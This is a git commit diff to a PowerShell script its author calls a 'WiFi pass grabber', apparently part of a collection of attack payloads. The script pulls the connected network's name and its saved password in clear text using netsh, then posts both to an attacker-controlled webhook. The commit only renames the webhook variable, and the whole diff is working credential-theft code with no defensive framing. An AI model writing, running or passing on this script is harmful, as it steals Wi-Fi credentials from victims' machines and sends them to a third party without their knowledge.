6938587e145a89e6f7681141a6b7d78afd286056
will-c0de <40558280+will-c0de@users.noreply.github.com>
2023-01-28 20:34:02 +0000

    📜 Edited the WiFi pass grabber [v1.2]

--- assets/WiFi-Pass/WiFi-Pass.ps1
+++ assets/WiFi-Pass/WiFi-Pass.ps1
@@ -8,9 +8,10 @@
 #  #+#+# #+#+#      #+#     #+#        #+#        
 #   ###   ###   ########### ########## ##########
 
+$webhookUrl = '$wh'
 $ssid = netsh wlan show interface | Select-String -Pattern ' SSID '
 $ssid = [string]$ssid
 $pos = $ssid.IndexOf(':')
 $ssid = $ssid.Substring($pos+2).Trim()
 $pass = (((netsh.exe wlan show profiles name="$ssid" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
-Invoke-RestMethod -Method Post -Uri "$wh" -Body "$ssid : $pass"
+Invoke-RestMethod -Method Post -Uri "$webhookUrl" -Body "$ssid : $pass"
